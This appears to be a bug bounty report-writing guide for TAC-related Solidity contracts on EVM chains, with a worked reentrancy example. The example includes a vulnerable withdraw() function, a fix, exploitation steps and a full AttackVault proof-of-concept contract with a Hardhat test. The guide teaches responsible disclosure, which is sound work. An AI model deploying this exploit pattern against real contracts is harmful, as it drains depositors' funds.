---
title: EVM Smart Contacts
description:
---

## Bug Bounty Report Guide

The report template below covers vulnerabilities in TAC-related Solidity contracts deployed on EVM-compatible
chains (TAC, Ethereum, etc.). Some of them are available [here](/ecosystem/network-info). Tools: Hardhat / Foundry / Tenderly.

## Report Template

```
SECURITY VULNERABILITY REPORT
<Protocol> — <Severity> <Class> in <ContractName>
Date: YYYY-MM-DD
Status: <THEORETICAL | TESTNET CONFIRMED | MAINNET CONFIRMED>


===============================
EXECUTIVE SUMMARY
===============================

<function broken, funds at risk, repeatability>


===============================
VULNERABILITY DETAILS
===============================

Contract:     <file>, <function>, lines <X–Y>
Deployed:     <address>
SWC / class:  <SWC-NNN or category>

Root cause:
  <one sentence at line level>

Vulnerable snippet:
  <code>

Fixed version:
  <code>

Prerequisites:
  <conditions>


===============================
EXPLOITATION STEPS
===============================

1. <step>
2. <step>
...


===============================
POC RESULTS
===============================

Attack contract:   <addr>
Exploit TX:        <hash>
Block:             <number>

Balance table:
  <address>   before → after   delta

Scaling:
  <seed deposit → max extractable → gas>


===============================
IMPACT ASSESSMENT
===============================

Severity: <CRITICAL | HIGH | MEDIUM | LOW>

  1. <point>
  2. <point>


===============================
RECOMMENDED FIX
===============================

Immediate:   <change>
Long-term:   <architectural>
Audit:       <adjacent functions>


===============================
PROOF-OF-CONCEPT CODE
===============================

<full self-contained Solidity + Hardhat/Foundry test>


===============================
DISCLOSURE TIMELINE
===============================

YYYY-MM-DD   <event>
YYYY-MM-DD   <event>
```

## Report Template Commentary

### 1. Title and Metadata

```
SECURITY VULNERABILITY REPORT
<Protocol> — <Severity> <Class> in <ContractName>
Date: YYYY-MM-DD
Status: <THEORETICAL | TESTNET CONFIRMED | MAINNET CONFIRMED>
```

Useful tags to name in the title:
`Reentrancy`, `Access Control`, `Price Manipulation`, `Unchecked Return Value`,
`Signature Replay`, `Upgradeable Storage Collision`, `Integer Overflow`.

### 2. Executive Summary

Same four questions as always:

1. **What is broken?** — one sentence naming the vulnerable function.
2. **What does the attacker gain?** — drained funds / minted tokens / ownership takeover.
3. **How much?** — TVL at risk or maximum extractable value (MEV).
4. **Is it repeatable?** — per-block / per-tx / once.

**Example:**

```
The withdraw() function in Vault.sol does not follow Checks-Effects-Interactions.
An attacker with 1 TAC can drain the entire contract balance (~420 TAC) in a
single transaction via reentrancy. The attack requires no special roles.
```

### 3. Vulnerability Details

#### 3.1 Affected Contract

```
Contract:  contracts/Vault.sol
Function:  withdraw(uint256 amount)  — lines 87–104
Deployed:  0x<address>  (mainnet / testnet)
```

Provide a source-verified link on TAC Explorer / Etherscan / Blockscout if available.

#### 3.2 Root Cause

Name the **SWC / Solodit category** and give the one-line explanation:

> **SWC-107 (Reentrancy):** `balances[msg.sender]` is decremented **after**
> the external `.call{value: amount}("")`, allowing the callee to re-enter
> `withdraw()` before the balance is zeroed.

#### 3.3 Vulnerable Code Snippet

```solidity
// Vault.sol:87 — VULNERABLE
function withdraw(uint256 amount) external {
    require(balances[msg.sender] >= amount);
    (bool ok,) = msg.sender.call{value: amount}(""); // <-- re-entry point
    require(ok);
    balances[msg.sender] -= amount;                  // <-- too late
}
```

#### 3.4 Fixed Version (for comparison)

```solidity
// CEI-correct version
function withdraw(uint256 amount) external {
    require(balances[msg.sender] >= amount);
    balances[msg.sender] -= amount;                  // effect first
    (bool ok,) = msg.sender.call{value: amount}("");
    require(ok);
}
```

#### 3.5 Prerequisites

```
- Attacker must have a non-zero deposit in the Vault (min 1 wei).
- No time-lock or withdrawal limit on the contract.
```


### 4. Exploitation Steps

```
1. Deploy AttackVault with address of Vault.
2. Call AttackVault.fund{value: 1 ether}() — seeds attacker deposit.
3. Call AttackVault.attack() — triggers withdraw(), re-enters 420 times,
   drains all TAC from Vault.
4. Call AttackVault.collect() — sends drained TAC to attacker EOA.
```

### 5. PoC Results

Required:
- Attack contract address.
- TX hash of the exploit.
- Block number.
- Balance before/after for the Vault and the attacker.

**Example table:**

```
ADDRESS                BALANCE BEFORE    BALANCE AFTER    DELTA
-------                --------------    -------------    -----
Vault                  420.000 TAC       0.000 TAC        -420 TAC
AttackVault            1.000 TAC         421.000 TAC      +420 TAC
Attacker EOA           0.000 TAC         421.000 TAC      +420 TAC (after collect)
```

**Exploit TX:** `0x<hash>`  
**Block:** `<number>`  
**Gas used:** `<amount>` (~$XX at current prices)

#### 5.1 Scaling Economics

```
Seed deposit    Vault TVL drained    Gas cost    Net profit
-----------     -----------------    --------    ----------
1 wei           any                  ~0.01 TAC   TVL − 0.01 TAC
```

The exploit is TVL-agnostic: any non-zero deposit drains the full balance.


### 6. Impact Assessment

```
Severity: CRITICAL

  1. Full TVL drainage — all depositor funds at risk.
  2. No special roles required — any depositor can exploit.
  3. Single transaction — no setup window for defenders.
  4. Irreversible — no admin pause function exists.
```

Mention if the contract is **upgradeable** (proxy pattern) — this affects
whether a hotfix can be deployed without migrating funds.

### 7. Recommended Fix

#### Immediate

```
Apply Checks-Effects-Interactions: move all state updates (balances[msg.sender] -= amount)
BEFORE the external call.

Alternatively, add a ReentrancyGuard (OpenZeppelin) nonReentrant modifier.
```

#### Long-term

```
Adopt OpenZeppelin ReentrancyGuardTransient (EIP-1153) for lower gas cost.
Add Slither / Aderyn to CI to catch CEI violations at PR time.
```

Adjacent Audit

```
Audit all other functions that perform external calls followed by state updates:
borrow(), liquidate(), flashLoan() — same pattern may exist.
```

### 8. Proof-of-Concept Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVault {
    function deposit() external payable;
    function withdraw(uint256) external;
}

contract AttackVault {
    IVault public vault;
    address public owner;
    uint256 public constant AMOUNT = 1 ether;

    constructor(address _vault) { vault = IVault(_vault); owner = msg.sender; }

    function fund() external payable { vault.deposit{value: msg.value}(); }

    function attack() external {
        vault.withdraw(AMOUNT);
    }

    receive() external payable {
        if (address(vault).balance >= AMOUNT) {
            vault.withdraw(AMOUNT);
        }
    }

    function collect() external {
        payable(owner).transfer(address(this).balance);
    }
}
```

Hardhat runner (abbreviated):

```typescript
const vault = await ethers.deployContract("Vault", { value: parseEther("420") });
const atk   = await ethers.deployContract("AttackVault", [vault.target]);
await atk.fund({ value: parseEther("1") });
await atk.attack();
console.log("Vault balance:", await ethers.provider.getBalance(vault.target));
// expected: 0
```

